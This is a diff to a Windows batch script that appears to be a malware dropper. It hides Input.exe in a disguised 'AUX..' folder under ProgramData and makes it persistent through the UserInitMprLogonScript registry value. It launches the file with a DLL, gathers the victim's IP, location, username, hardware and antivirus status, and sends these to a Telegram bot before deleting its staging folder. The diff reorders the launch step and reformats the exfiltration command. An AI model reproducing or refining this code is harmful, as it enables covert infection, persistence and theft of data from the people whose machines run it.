@@ -26,6 +26,8 @@ move /Y "%ProgramData%\O\Input.exe" "\\.\%ProgramData%\AUX..\"
 
 reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" /f
 
+powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll
+
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
@@ -68,7 +70,8 @@ if "%Antivirus%"=="No Antivirus" set "Antivirus=No Antivirus"
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
-powershell -command "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%'; Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
+powershell -NoProfile -Command ^
+  "$message = 'RUSIGNAT' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
+  "Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
 endlocal
 rd /s /q "%ProgramData%\O"
-powershell.exe %ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll
